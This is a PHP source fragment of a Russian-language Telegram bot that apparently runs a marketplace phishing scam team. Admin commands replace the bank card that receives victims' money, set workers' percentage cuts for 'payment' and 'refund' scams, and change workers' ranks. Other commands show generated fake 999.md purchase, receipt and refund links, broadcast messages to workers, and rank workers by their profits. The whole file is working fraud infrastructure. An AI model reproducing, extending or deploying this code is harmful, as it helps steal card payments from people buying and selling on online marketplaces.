				case '/card1': {
					$t1 = getCard();
					$t2 = beaCard($cmd[1]);
					if (!$t2) {
						$result = [
							'❗️ Введите корректный номер карты',
						];
						break;
					}
					setCard($t2);
					$result = [
						'💳 <b>Карта платежки заменена</b>',
						'',
						'❔ Старая: <b>'.$t1.'</b>',
						'☘️ Новая: <b>'.$t2.'</b>',
						'❕ Банк: <b>'.cardBank($t2).'</b>',
					];
					botSend([
						'💳 <b>Замена карты платежки</b>',
						'',
						'❔ Старая: <b>'.cardHide($t1).'</b>',
						'☘️ Новая: <b>'.cardHide($t2).'</b>',
						'👤 Заменил: <b>'.userLogin($id, true, true).'</b>',
					], chatAlerts());
					$flag = true;
					break;
				}
				case '/rank': {
					$t = explode(' ', $cmd[1], 2);
					$id2 = $t[0];
					if ($id2 == '' || !isUser($id2)) {
						$result = [
							'❗️ Пользователь с таким ID не найден',
						];
						break;
					}
					$rank = intval($t[1]);
					if ($rank < 0 || $rank > getUserStatus($id)) {
						$result = [
							'❗️ Введите корректный статус',
						];
						break;
					}
					$rank0 = getUserStatus($id2);
					$t2 = ($rank > $rank0);
					setUserStatus($id2, $rank);
					$result = [
						'⭐️ <b>Статус изменен</b>',
						'',
						'🌱 Был: <b>'.userStatusName($rank0).'</b>',
						'🙊 Стал: <b>'.userStatusName($rank).'</b>',
						'👤 Воркер: <b>'.userLogin($id2, true).'</b>',
						($t2 ? '❤️ Повысил' : '💙 Понизил').': <b>'.userLogin($id, true, true).'</b>',
					];
					botSend([
						'⭐️ <b>Изменение статуса</b>',
						'',
						'🌱 Был: <b>'.userStatusName($rank0).'</b>',
						'🙊 Стал: <b>'.userStatusName($rank).'</b>',
						'👤 Воркер: <b>'.userLogin($id2, true).'</b>',
						($t2 ? '❤️ Повысил' : '💙 Понизил').': <b>'.userLogin($id, true, true).'</b>',
					], chatAlerts());
					$flag = true;
					break;
				}
				case '/track': {
					$item = $cmd[1];
					if (!isItem($item, false))
						break;
					$itemd = getItemData($item, false);
					$id2 = $itemd[3];
					$list = R::find('info',' track = ?',[$item]);
					$i       = 1;
					foreach ($list as $key) {
						$i++;
					}
					$result = [
						'☄️ <b>Информация о ссылке</b>',
						'',
						'🆔 Идентификатор: <b>'.$item.'</b>',
						'💵 Стоимость: <b>'.beaCash($itemd[5]).'</b>',
						'',
						'📆 Дата генерации: <b>'.date('d.m.Y</b> в <b>H:i', $itemd[4]).'</b>',
						'',
						'🗳 999.md: <b><a href=\''.$key->md1.'\'>Покупка</a></b> / <b><a href=\''.$key->md2.'\'>Получение</a></b> / <b><a href=\''.$key->refund.'\'>Возврат</a></b>',
						'',
						'👤 Воркер: <b>'.userLogin($id2, true, true).'</b>',
					];
					$flag = true;
					break;
				}
				case '/items': {
					$id2 = $cmd[1];
					if (!isUser($id2))
						break;
					$items = getUserItems($id2, true);
					$tracks = getUserItems($id2, false);
					$itemsc = count($items);
					$tracksc = count($tracks);
					if ($itemsc == 0 && $tracksc == 0) {
						$result = [
							'❗️ У <b>'.userLogin($id2, true, true).'</b> нет объявлений и трек номеров',
						];
						break;
					}
					$result = [
						'🗂 <b>Активные объявления '.userLogin($id2, true, true).':</b>',
						'',
					];
					if ($itemsc != 0) {
						$result[] = '📦 <b>Объявления ('.$itemsc.'):</b>';
						for ($i = 0; $i < $itemsc; $i++) {
							$item = $items[$i];
							$itemd = getItemData($item, true);
							$result[] = ($i + 1).'. <b>'.$item.'</b> - <b>'.$itemd[6].'</b> за <b>'.beaCash($itemd[5]).'</b>';
						}
					}
					if ($tracksc != 0) {
						if ($itemsc != 0)
							$result[] = '';
						$result[] = '☄️ <b>Трек номера ('.$tracksc.'):</b>';
						for ($i = 0; $i < $tracksc; $i++) {
							$track = $tracks[$i];
							$trackd = getItemData($track, false);
							$result[] = ($i + 1).'. <b>'.$track.'</b> - <b>'.$trackd[6].'</b> за <b>'.beaCash($trackd[5]).'</b>';
						}
					}
					$flag = true;
					break;
				}
				case '/say': {
					$t = $cmd[1];
					if (strlen($t) < 1)
						break;
					$result = [
						'✅ <b>Сообщение отправлено в чат воркеров</b>',
					];
					botSend([
						$t,
					], chatGroup());
					$flag = true;
					break;
				}
				case '/help': {
					$t = $cmd[1];
					if (strlen($t) < 1)
						break;
					$result = [
						'✅ <b>⚙️Основные команды⚙️

							/help - Основные команды
							/say (Сообщение) - Отправить в чат воркеров
							/alert (Сообщение) - Отправить всем в лс
							/newRate (Ставка)
							/items (ID) - Объявлении, Трэк-коды воркера
							/payment (1/2/3/4) - Смена платежки (МТС Деньги, ЮниКредит Банк, Промсвязьбанк, Уралсиб Банк, Ручная)
							/rank (ID воркера)
							/card1 (Карта для приема)
							/user (ID) - Информация про воркера
							/cards - Основные карты</b>',
						];
						break;
					}
				case '/alert': {
					$t = $cmd[1];
					if (strlen($t) < 1)
						break;
					if (md5($t) == getLastAlert())
						break;
					setLastAlert(md5($t));
					$t2 = alertUsers($t);
					$result = [
						'✅ <b>Сообщение отправлено всем воркерам</b>',
						'',
						'👍 Отправлено: <b>'.$t2[0].'</b>',
						'👎 Не отправлено: <b>'.$t2[1].'</b>',
					];
					$flag = true;
					break;
				}
                case '/newRate': {
                    $rateData = explode('/', $cmd[1]);

                    if (preg_match('/\d{2}\/\d{2}/', trim($cmd[1]))) {
                        file_put_contents('settings/rate.txt', "$rateData[0]`$rateData[1]");

                        $result = ['**Ставка была успешно изменена**'];
                        $flag = true;
                        break;
                    }
                    else{
                        $result = [
                            '**Ставка не была изменена**',
                            'Пожалуйста проверьте введенную вами команду',
                            'Пример: **/newRate 40/60**'
                        ];
                        $flag = true;
                        break;
                    }
                }
			}
			break;
		}
		case chatGroup(): {
			if ($member) {
				$id2 = $member['id'];
				if (isUser($id2) && isUserAccepted($id2)) {
					$t = getRate();
					$result = [
						'😉 Добро пожаловать в чат, <b><a href="tg://user?id='.$id2.'">'.$member['first_name'].' '.$member['last_name'].'</a></b>',
						'',
						'🤖 Бот: <b>@'.botLogin().'</b>',
						'💸 Канал с профитами: <b><a href="'.linkPays().'">Перейти</a></b>',
						'',
						'🔥 Оплата - <b>'.$t[0].'%</b>, возврат - <b>'.$t[1].'%</b>',
						'💳 Принимаем от <b>'.beaCash(amountMin()).'</b> до <b>'.beaCash(amountMax()).'</b>',
					];
				} else {
					/*botKick($id2, $chat);
					$t = $member['username'];
					if (!$t || $t == '')
						$t = 'Без ника';
					botSend([
						'❗️ <b><a href="tg://user?id='.$id2.'">'.$t.'</a> ['.$id2.']</b> кикнут с чата за попытку вступить по ссылке',
					], chatAlerts());*/
					return;
				}
				break;
			}

			switch ($cmd[0]) {
				case '/top': {
					$t = intval($cmd[1]);
					if ($t < 1 || $t > 2)
						$t = 1;
					else
						$edit = true;
					$t2 = '';
					if ($t == 1)
						$t2 = '💸 <b>Топ-10 по общей сумме профитов:</b>';
					elseif ($t == 2)
						$t2 = '🤝 <b>Топ-10 по профиту от рефералов:</b>';
					$top = [];
					foreach (glob(dirUsers('*')) as $t4) {
						$id2 = basename($t4);
						$v = 0;
						if ($t == 1)
							$v = getUserProfit($id2)[1];
						elseif ($t == 2)
							$v = getUserRefbal($id2);
						if ($v <= 0)
							continue;
						$top[$id2] = $v;
					}
					asort($top);
					$top = array_reverse($top, true);
					$top2 = [];
					$cm = min(10, count($top));
					$c = 1;
					foreach ($top as $id2 => $v) {
						$t3 = '';
						if ($t == 1) {
							$t4 = getUserProfit($id2)[0];
							$t3 = '<b>'.beaCash($v).'</b> - <b>'.$t4.' '.selectWord($t4, ['профитов', 'профит', 'профита']).'</b>';
						}
						elseif ($t == 2) {
							$t4 = getUserRefs($id2);
							$t3 = '<b>'.beaCash($v).'</b> - <b>'.$t4.' '.selectWord($t4, ['рефералов', 'реферал', 'реферала']).'</b>';
						}
						$top2[] = $c.'. <b>'.userLogin2($id2).'</b> - '.$t3;
						$c++;
						if ($c > $cm)
							break;
					}
					$result = [
						$t2,
						'',
					];
					$result = array_merge($result, $top2);
					$keybd = [];
					for ($i = 1; $i <= 2; $i++) {
						if ($i != $t)
							$keybd[] = [
								['text' => $btns['topshw'.$i], 'callback_data' => '/top '.$i],
							];
					}
					$keybd = [true, $keybd];
					break;
				}
			}
			break;
		}
	}
	if (!$result)
		exit();
	if ($edit)
		botEdit($result, $mid, $chat, $keybd);
	else
		botSend($result, $chat, $keybd);
		
		
		
?>